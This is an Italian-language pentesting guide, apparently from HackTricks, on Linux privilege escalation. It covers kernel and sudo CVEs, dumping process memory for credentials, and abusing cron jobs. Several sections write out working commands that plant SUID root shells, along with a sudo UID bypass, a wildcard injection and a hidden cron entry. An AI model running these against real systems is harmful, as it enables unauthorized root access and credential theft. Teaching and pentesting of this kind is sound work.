# Linux Privilege Escalation

{{#include ../../../banners/hacktricks-training.md}}

Per un contesto più ampio e per i workflow storici di enumerazione, confronta le risorse g0tmi1k, Payatu, SANS, LPE Workshop, Linux-Privilege-Escalation e linux-private-i elencate nei riferimenti.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>

## Informazioni sul sistema

### Informazioni sul sistema operativo

Iniziamo raccogliendo alcune informazioni sul sistema operativo in esecuzione.

```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```

### Path

Se **disponi di permessi di scrittura su una qualsiasi cartella** all'interno della variabile `PATH`, potresti essere in grado di fare hijacking di alcune librerie o binari:

```bash
echo $PATH
```

### Informazioni sull'ambiente

Informazioni interessanti, password o chiavi API nelle variabili d'ambiente?

```bash
(env || set) 2>/dev/null
```

### Exploit del kernel

Controlla la versione del kernel e verifica se esistono exploit che possono essere usati per aumentare i privilegi.

La [sezione Kernel/LPE/CVE](../../main-system-information/kernel-lpe-cves/README.md) raccoglie casi di escalation locale e rimanda agli approfondimenti sul kernel Linux in Binary Exploitation. Verifica la build e la configurazione interessate prima di testare un caso di studio.

```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```

Puoi trovare un buon elenco di kernel vulnerabili e alcuni **compiled exploits** già pronti qui: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) e [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).<sup>[[12]](#references)</sup>\
Altri siti dove puoi trovare alcuni **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Per estrarre tutte le versioni vulnerabili del kernel da quel sito, puoi eseguire:

```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```

Gli strumenti che possono aiutare a cercare kernel exploit sono:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (da eseguire SULLA vittima, verifica solo gli exploit per kernel 2.x)

Cerca sempre **la versione del kernel su Google**: potresti trovare la tua versione del kernel indicata in un kernel exploit e avere così la certezza che l'exploit sia valido.

Altre tecniche di kernel exploitation:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Escalation dei privilegi Linux - Linux Kernel <= 3.19.0-73.8

```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

### Versione di sudo

In base alle versioni vulnerabili di sudo indicate in:

```bash
searchsploit sudo
```

Puoi verificare se la versione di sudo è vulnerabile usando questo grep.

```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

### Sudo < 1.9.17p1

Le versioni upstream di sudo dalla **1.9.14 alla 1.9.17** consentono agli utenti locali senza privilegi di ottenere i privilegi di root tramite l'opzione `--chroot`, quando sudo carica `/etc/nsswitch.conf` da una directory controllata dall'utente; upstream ha corretto il problema nella **1.9.17p1**. Controlla tutti i binari sudo eseguibili con root-setuid nei percorsi rilevanti, poiché `sudo -V` mostra solo il binario selezionato da `PATH`. I pacchetti delle distribuzioni potrebbero includere la correzione tramite backport senza modificare la stringa della versione upstream, quindi verifica anche lo stato del pacchetto del vendor. Consulta l'[avviso del maintainer di sudo](https://www.openwall.com/lists/oss-security/2025/06/30/3).<sup>[[28]](#references)[[29]](#references)</sup>

Ecco una [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) per sfruttare questa [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Prima di eseguire l'exploit, assicurati che la tua versione di `sudo` sia vulnerabile e supporti la funzionalità `chroot`.

Per ulteriori informazioni, consulta l'[avviso originale sulla vulnerability](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/).<sup>[[28]](#references)</sup>

### Bypass delle regole host-based di sudo (CVE-2025-32462)

Le versioni upstream di sudo dalla **1.8.8 alla 1.9.17** possono valutare le regole sudoers host-based usando il **nome host fornito dall'utente** con `sudo -h <host>` invece del **nome host effettivo**; upstream ha corretto il problema nella **1.9.17p1**. L'utente deve comunque avere una voce sudoers corrispondente sull'host selezionato. Verifica anche i backport del vendor e i binari sudo alternativi, oltre ai criteri locali. Consulta l'[avviso del maintainer di sudo](https://www.openwall.com/lists/oss-security/2025/06/30/2).<sup>[[29]](#references)</sup>

Requisiti:
- Versione vulnerabile di sudo
- Regole sudoers specifiche per l'host (l'host non è né il nome host corrente né `ALL`)

Esempio di pattern sudoers:

```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```

Exploit tramite spoofing dell'host consentito:

```bash
sudo -h devbox id
sudo -h devbox -i
```

Se la risoluzione del nome selezionato si blocca, verifica come viene risolto quel nome sull’host. La semplice presenza di un nome in un log o in un file di configurazione non significa che sia risolvibile; inoltre, modificare `/etc/hosts` richiede normalmente privilegi di scrittura.

#### sudo < v1.8.28

Questo [Runas UID bypass upstream](https://ubuntu.com/security/CVE-2019-14287) richiede una regola sudo effettiva che consenta di eseguire un comando come qualsiasi utente, escludendo root, ad esempio `(ALL, !root) /bin/bash`. Anche il chiamante deve essere autorizzato a usare tale regola, compresi gli eventuali requisiti di autenticazione. Consulta l’avviso del pacchetto installato: i vendor hanno retroportato la correzione in versioni il cui numero upstream visualizzato è ancora inferiore a 1.8.28. Una regola `!root` o una versione datata, da sole, non confermano la presenza della vulnerabilità. Non testare un comando privilegiato durante l’enumerazione passiva.

```
sudo -u#-1 /bin/bash
```

### Verifica della firma Dmesg non riuscita

Controlla la box **smasher2** di HTB per un **esempio** di come sfruttare questa vuln

```bash
dmesg 2>/dev/null | grep "signature"
```

### Ulteriore enumerazione del sistema

```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```

## Enumerare le possibili difese

### AppArmor

```bash
if [ `which aa-status 2>/dev/null` ]; then
    aa-status
  elif [ `which apparmor_status 2>/dev/null` ]; then
    apparmor_status
  elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
    ls -d /etc/apparmor*
  else
    echo "Not found AppArmor"
fi
```

### Grsecurity

```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```

### PaX

```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```

### Execshield

```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```

### SElinux

```bash
 (sestatus 2>/dev/null || echo "Not found sestatus")
```

### ASLR

```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```

## Container Breakout

Se ti trovi all'interno di un container, inizia dalla seguente sezione sulla sicurezza dei container e poi passa alle pagine sugli abusi specifici del runtime:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Unità

Controlla **cosa è montato e smontato**, dove e perché. Se qualcosa è smontato, puoi provare a montarlo e cercare informazioni private.

```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```

## Software utili

Elenca i binari utili

```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```

Inoltre, verifica se è installato **un compilatore qualsiasi**. È utile se devi usare un exploit del kernel, perché è consigliabile compilarlo sulla macchina in cui intendi utilizzarlo (o su una simile).

```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```

### Software vulnerabile installato

Controlla la **versione dei pacchetti e dei servizi installati**. Potrebbe esserci una vecchia versione di Nagios, per esempio, che può essere sfruttata per l'escalation dei privilegi…\
Si consiglia di controllare manualmente la versione dei software installati più sospetti.

```bash
dpkg -l #Debian
rpm -qa #Centos
```

Se hai accesso SSH alla macchina, potresti anche usare **openVAS** per verificare se sulla macchina è installato software obsoleto e vulnerabile.

> [!NOTE] > _Nota: questi comandi mostreranno molte informazioni, perlopiù inutili; pertanto, si consiglia di usare applicazioni come OpenVAS o simili, che verificheranno se una delle versioni del software installato è vulnerabile a exploit noti_

## Processi

Dai un'occhiata a **quali processi** sono in esecuzione e verifica se qualcuno ha **più privilegi del dovuto** (magari un tomcat eseguito da root?)

```bash
ps aux
ps -ef
top -n 1
```

Controlla sempre se ci sono [**debugger electron/cef/chromium** in esecuzione: potresti abusarne per ottenere un’escalation dei privilegi](../../software-information/electron-cef-chromium-debugger-abuse.md). **Linpeas** li rileva controllando la presenza del parametro `--inspect` nella riga di comando del processo.\
Controlla anche **i tuoi privilegi sui binari dei processi**: forse puoi sovrascriverne qualcuno.

### Catene di processi padre-figlio tra utenti diversi

Un processo figlio eseguito con un **utente diverso** da quello del processo padre non è automaticamente malevolo, ma è un **segnale utile per il triage**. Alcune transizioni sono previste (`root` che avvia un service user, i gestori di login che creano processi di sessione), ma catene insolite possono rivelare wrapper, debug helper, persistenza o confini di fiducia deboli in fase di esecuzione.

Controllo rapido:

```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```

Se trovi una catena insolita, esamina la riga di comando del processo padre e tutti i file che ne influenzano il comportamento (`config`, `EnvironmentFile`, script helper, directory di lavoro, argomenti modificabili). In diversi percorsi reali di privesc, il processo figlio non era modificabile, ma lo erano la **config controllata dal processo padre** o la catena di helper.

### Eseguibili eliminati e file aperti poi eliminati

Gli artefatti di runtime sono spesso ancora accessibili **dopo l’eliminazione**. Questo è utile sia per l’escalation dei privilegi sia per recuperare prove da un processo che ha già aperto file sensibili.

Controlla gli eseguibili eliminati:

```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```

Se `/proc/<PID>/exe` punta a `(deleted)`, il processo sta ancora eseguendo la vecchia immagine binaria dalla memoria. È un forte segnale da approfondire perché:

- l'eseguibile rimosso potrebbe contenere stringhe interessanti o credenziali
- il processo in esecuzione potrebbe ancora esporre file descriptor utili
- un binario privilegiato eliminato può indicare manomissioni recenti o un tentativo di ripulire le tracce

Raccogli i file eliminati ma ancora aperti a livello globale:

```bash
lsof +L1
```

Se trovi un descrittore interessante, recuperalo direttamente:

```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```

Questo è particolarmente utile quando un processo ha ancora aperto un secret, uno script, un'esportazione di database o un file flag eliminato.

### Monitoraggio dei processi

Puoi usare strumenti come [**pspy**](https://github.com/DominicBreuker/pspy) per monitorare i processi. Può essere molto utile per identificare processi vulnerabili eseguiti frequentemente o quando viene soddisfatto un insieme di requisiti.

#### ProcMon per Linux con sudo

[ProcMon per Linux](https://github.com/microsoft/ProcMon-for-Linux) può tracciare processi e chiamate di sistema selezionati e salvare una traccia SQLite. Se `sudo -l` consente l'esecuzione senza restrizioni del comando `procmon` con privilegi root, valuta se potrebbe osservare l'input o l'output del processo di un altro utente. Questo permesso è solo un elemento da approfondire: contano anche il supporto del tracer, le policy effettive e l'attività di un processo idoneo. I file di traccia possono contenere segreti, quindi esamina attentamente le esportazioni autorizzate ed evita di raccogliere dati di processi non pertinenti.

### Memoria dei processi

Alcuni servizi di un server salvano **le credenziali in chiaro nella memoria**.\
Normalmente servono **privilegi root** per leggere la memoria dei processi appartenenti ad altri utenti, quindi questa attività è solitamente più utile quando hai già i privilegi root e vuoi scoprire altre credenziali.\
Tuttavia, ricorda che **come utente normale puoi leggere la memoria dei processi che possiedi**.

> [!WARNING]
> Nota che oggi la maggior parte dei computer **non consente ptrace per impostazione predefinita**, il che significa che non puoi eseguire il dump degli altri processi appartenenti al tuo utente non privilegiato.
>
> Il file _**/proc/sys/kernel/yama/ptrace_scope**_ controlla l'accessibilità di ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: tutti i processi possono essere sottoposti a debug, purché abbiano lo stesso uid. Questo è il modo classico in cui funzionava ptrace.
> - **kernel.yama.ptrace_scope = 1**: può essere sottoposto a debug solo un processo padre.
> - **kernel.yama.ptrace_scope = 2**: solo un amministratore può usare ptrace, poiché è necessaria la capability CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: nessun processo può essere tracciato con ptrace. Una volta impostato, è necessario riavviare il sistema per abilitare nuovamente ptrace.

Un processo con lo stesso UID che sblocca brevemente un password vault può costituire un confine di sicurezza distinto per le credenziali. Quando il tracing è consentito, un processo attivo e dumpable può esporre la password del vault tramite le syscall di input o la memoria, anche se il file del vault cifrato rimane protetto. `ptrace_scope=0` è solo uno dei prerequisiti: contano anche le credenziali corrispondenti, la dumpability del processo bersaglio, gli altri moduli di sicurezza Linux e la durata del processo. Per stabilire se una voce del vault consente l'accesso root a Unix, occorre verificare separatamente il riutilizzo delle credenziali. L'enumerazione di routine dovrebbe segnalare la policy e i percorsi dei processi o dei vault candidati, senza acquisire input né mostrare segreti. Consulta la [documentazione Yama del kernel](https://cdn.kernel.org/doc/html/latest/admin-guide/LSM/Yama.html) e i [controlli di accesso ptrace](https://man7.org/linux/man-pages/man2/ptrace.2.html).

#### GDB

Se hai accesso alla memoria di un servizio FTP, ad esempio, potresti ottenere l'Heap e cercarvi le credenziali.

```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```

#### Script GDB

```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
    | while read start stop; do \
    gdb --batch --pid $1 -ex \
    "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```

#### /proc/$pid/maps & /proc/$pid/mem

Per un dato ID di processo, **maps mostra come la memoria è mappata nello spazio degli indirizzi virtuali del processo**; mostra anche le **autorizzazioni di ogni regione mappata**. Il file pseudo **mem espone la memoria stessa del processo**. Dal file **maps** sappiamo quali **regioni di memoria sono leggibili** e i relativi offset. Usiamo queste informazioni per **posizionarci nel file mem ed esportare tutte le regioni leggibili** in un file.

```bash
procdump()
(
    cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
    while read a b; do
        dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
           skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
    done )
    cat $1*.bin > $1.dump
    rm $1*.bin
)
```

#### /dev/mem

`/dev/mem` fornisce accesso alla memoria **fisica** del sistema, non alla memoria virtuale. Lo spazio degli indirizzi virtuali del kernel è accessibile tramite /dev/kmem.\
In genere, `/dev/mem` è leggibile solo da **root** e dal gruppo **kmem**.

```
strings /dev/mem -n10 | grep -i PASS
```

### ProcDump per Linux

ProcDump è una reinterpretazione per Linux del classico strumento ProcDump della suite Sysinternals per Windows. Scaricalo da [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)

```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```

### Strumenti

Per eseguire il dump della memoria di un processo puoi usare:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Puoi rimuovere manualmente i requisiti di root ed eseguire il dump di un processo di tua proprietà
- Script A.5 da [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (è necessario root)

### Credenziali dalla memoria di un processo

#### Esempio manuale

Se scopri che il processo authenticator è in esecuzione:

```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```

Puoi eseguire il dump del processo (vedi le sezioni precedenti per trovare diversi modi per eseguire il dump della memoria di un processo) e cercare credenziali nella memoria:

```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```

#### mimipenguin

Lo strumento [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **ruba credenziali in chiaro dalla memoria** e da alcuni **file noti**. Per funzionare correttamente richiede privilegi di root.

| Funzionalità                                      | Nome processo       |
| ------------------------------------------------- | -------------------- |
| Password GDM (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (connessioni FTP attive)                   | vsftpd               |
| Apache2 (sessioni HTTP Basic Auth attive)         | apache2              |
| OpenSSH (sessioni SSH attive - uso di Sudo)        | sshd:                |

#### Espressioni regolari di ricerca/[truffleproc](https://github.com/controlplaneio/truffleproc)

```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```

## Job pianificati/Cron

### Crontab UI (alseambusher) in esecuzione come root – privesc tramite scheduler web

Se un pannello web “Crontab UI” (alseambusher/crontab-ui) è in esecuzione come root ed è associato solo all’interfaccia loopback, puoi comunque raggiungerlo tramite SSH local port-forwarding e creare un job privilegiato per ottenere l’escalation.<sup>[[1]](#references)[[4]](#references)</sup>

Catena tipica
- Individua una porta accessibile solo tramite loopback (ad es., 127.0.0.1:8000) e il realm Basic-Auth usando `ss -ntlp` / `curl -v localhost:8000`
- Cerca le credenziali negli artefatti operativi:
  - Backup/script con `zip -P <password>`
  - Unità systemd che espongono `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Crea il tunnel e accedi:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Crea un job con privilegi elevati ed eseguilo immediatamente (crea una shell SUID):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Usalo:
```bash
/tmp/rootshell -p   # root shell
```

Hardening
- Non eseguire Crontab UI come root; usa un utente dedicato e autorizzazioni minime
- Associa il servizio a localhost e limita ulteriormente l’accesso tramite firewall/VPN; non riutilizzare le password
- Evita di incorporare segreti nei file unit; usa secret store o un file EnvironmentFile accessibile solo a root
- Abilita audit/logging per l’esecuzione dei job su richiesta

Verifica se qualche job pianificato è vulnerabile. Potresti riuscire a sfruttare uno script eseguito da root (vuln di tipo wildcard? Puoi modificare i file usati da root? Usare symlink? Creare file specifici nella directory usata da root?).

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

Se viene usato `run-parts`, controlla quali nomi verranno effettivamente eseguiti:

```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```

Questo evita i falsi positivi. Una directory periodica scrivibile è utile solo se il nome del file del payload corrisponde alle regole locali di `run-parts`.

### Percorso cron

Ad esempio, dentro _/etc/crontab_ puoi trovare il PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Nota che l'utente "user" ha i permessi di scrittura su /home/user_)

Se in questo crontab l'utente root prova a eseguire un comando o uno script senza impostare il percorso. Ad esempio: _\* \* \* \* root overwrite.sh_\
Allora puoi ottenere una shell root usando:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```

### Cron che utilizza uno script con un carattere jolly (Wildcard Injection)

Se uno script viene eseguito da root e contiene un “**\***” all'interno di un comando, potresti sfruttarlo per fare cose impreviste (come privesc). Esempio:

```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```

**Se il carattere jolly è preceduto da un percorso, come** _**/some/path/\***_ **, non è vulnerabile (nemmeno** _**./\***_ **).**

Leggi la seguente pagina per scoprire altri trucchi di wildcard exploitation:


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection nei parser dei log di cron

L’aritmetica di Bash può interpretare testo non attendibile come un’espressione. Nei contesti interessati di Bash, un indice di array all’interno di tale espressione può valutare una command substitution. Se un parser privilegiato inserisce testo di log controllato da un utente malintenzionato in un confronto aritmetico, la sostituzione può essere eseguita con l’identità del parser.<sup>[[22]](#references)</sup> Il risultato dipende dall’espressione Bash esatta e dalla versione; una stringa isolata `$(...)0` in una variabile espansa, da sola, non dimostra in modo affidabile una nuova valutazione.

L’input può provenire anche dai metadati di un file o da un altro campo letto da una posizione scrivibile da un utente. Per esempio, uno script di cleanup privilegiato che legge un tag `Producer` da un’immagine e lo confronta con `[[ "$producer" -eq "expected" ]]` esegue un confronto aritmetico, anche se la variabile è racchiusa tra virgolette. Verifica l’identità con cui viene eseguito il processo pianificato, quali file possono fornire il tag, eventuali trasformazioni effettuate prima del confronto e il comportamento esatto di Bash. Per le etichette testuali, usa un confronto tra stringhe; per i numeri, convalida l’input affinché contenga solo cifre decimali prima di eseguire operazioni aritmetiche. Consulta le [regole aritmetiche di Bash](https://www.gnu.org/software/bash/manual/html_node/Shell-Arithmetic.html).

- Schema tipico vulnerabile:
  ```bash
  #!/bin/bash
  # Example: parse a log and "sum" a count field coming from the log
  while IFS=',' read -r ts user count rest; do
      # count is untrusted if the log is attacker-controlled
      (( total += count ))     # or: let "n=$count"
  done < /var/www/app/log/application.log
  ```

- Verifica locale sicura del comportamento del meccanismo di indicizzazione degli array (senza processi privilegiati o modifiche ai file):
  ```bash
  code='x[$(printf marker >&2)]'
  [[ 200 -eq "$code" ]]
  # Bash may print "marker" while evaluating the arithmetic operand.
  ```

Traccia lo script effettivamente pianificato e il percorso letterale di input che apre. Anche quando il file di log non è scrivibile, un utente che può scrivere nella directory padre non sticky e attraversarla potrebbe riuscire a sostituirne la voce; `namei -l` aiuta a distinguere questi permessi. Un percorso di log scrivibile diverso, uno scheduler non leggibile o un parser che non valuta mai quel campo come aritmetica Bash non dimostrano che questa via sia percorribile.

### Sovrascrittura di uno script Cron e symlink

Se **puoi modificare uno script cron** eseguito da root, puoi ottenere facilmente una shell:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```

Se lo script eseguito da root usa una **directory a cui hai accesso completo**, potrebbe essere utile eliminare quella cartella e **creare un symlink verso un'altra directory** che contenga uno script sotto il tuo controllo.

```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```

### Validazione dei symlink e gestione più sicura dei file

Quando esamini script/binari con privilegi che leggono o scrivono file tramite percorso, verifica come vengono gestiti i link:

- `stat()` segue un symlink e restituisce i metadati della destinazione.
- `lstat()` restituisce i metadati del link stesso.
- `readlink -f` e `namei -l` aiutano a risolvere la destinazione finale e mostrano i permessi di ogni componente del percorso.

```bash
readlink -f /path/to/link
namei -l /path/to/link
```

Per difensori e sviluppatori, tra le pratiche più sicure contro gli attacchi con symlink ci sono:

- `O_EXCL` con `O_CREAT`: fallisce se il percorso esiste già (blocca link/file creati in precedenza dall’attaccante).
- `openat()`: opera relativamente a un file descriptor di una directory attendibile.
- `mkstemp()`: crea file temporanei in modo atomico, con permessi sicuri.

### Binary cron con firma personalizzata e payload scrivibili
Un utente normale che può scrivere il binary esatto eseguito da un cron job di root può oltrepassare un confine di privilegi, ma una verifica della firma personalizzata può rifiutare una sostituzione non firmata. Nel caso documentato, l’ELF di proprietà di root aveva modalità `0760`, che consentiva a un membro del suo gruppo di modificarlo, mentre il proprietario root poteva eseguirlo. Una traccia visibile dei processi mostrava `objcopy` mentre estraeva `.text_sig` prima che il job eseguisse il binary; lo script completo del verificatore non era leggibile.<sup>[[2]](#references)</sup>

La sostituzione che ha funzionato era firmata con materiale di firma privato leaked, usando un ELF signer. La [documentazione del formato](https://github.com/NUAA-WatchDog/linux-elf-binary-signer) descrive una sezione di firma derivata da `.text` dell’eseguibile. Non è dimostrato che aggiungere semplicemente un certificato o una stringa corrispondente a `.text_sig` sia sufficiente a superare il verificatore non visibile. Prima di concludere che un binary firmato e scrivibile sia sfruttabile, verifica il percorso effettivamente pianificato, i permessi effettivi di scrittura, l’esecuzione da parte di root e la policy del verificatore. Una sezione `.text_sig` da sola è solo un indizio da approfondire.

### Job cron frequenti

Puoi monitorare i processi per cercare quelli eseguiti ogni 1, 2 o 5 minuti. Potresti riuscire a sfruttarli per elevare i privilegi.

Per esempio, per **monitorare ogni 0.1s per 1 minuto**, **ordinare i comandi eseguiti meno spesso per primi** ed eliminare i comandi eseguiti più spesso, puoi fare:

```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```

**Puoi anche usare** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (monitora ed elenca ogni processo che viene avviato).

### Backup di root che conservano i mode bit impostati dall’attaccante (pg_basebackup)

Se un cron di proprietà di root esegue `pg_basebackup` (o qualsiasi copia ricorsiva) su una directory del database su cui puoi scrivere, puoi inserire un **binario SUID/SGID** che verrà copiato nuovamente come **root:root**, mantenendo gli stessi mode bit, nella destinazione del backup.<sup>[[26]](#references)</sup>

Flusso tipico di ricognizione (come utente DB con privilegi limitati):
- Usa `pspy` per individuare un cron di root che esegue, ad esempio, `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` ogni minuto.
- Verifica che tu possa scrivere nel cluster sorgente (ad es., `/var/lib/postgresql/14/main`) e che la destinazione (`/opt/backups/current`) diventi di proprietà di root dopo l’esecuzione del job.

Exploit:

```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```

Questo funziona perché `pg_basebackup` mantiene i bit dei permessi dei file quando copia il cluster; se viene eseguito da root, i file di destinazione ereditano **la proprietà di root + i bit SUID/SGID scelti dall'attaccante**. Qualsiasi routine simile di backup/copia con privilegi elevati che mantiene i permessi e scrive in una posizione eseguibile è vulnerabile.

### Cron job invisibili

È possibile creare un cronjob **inserendo un ritorno carrello dopo un commento** (senza carattere di nuova riga), e il cron job funzionerà. Esempio (si noti il carattere di ritorno carrello):

```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```

Per rilevare questo tipo di voce stealth, ispeziona i file cron con strumenti che mostrano i caratteri di controllo:

```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```

## Servizi

### File _.service_ scrivibili

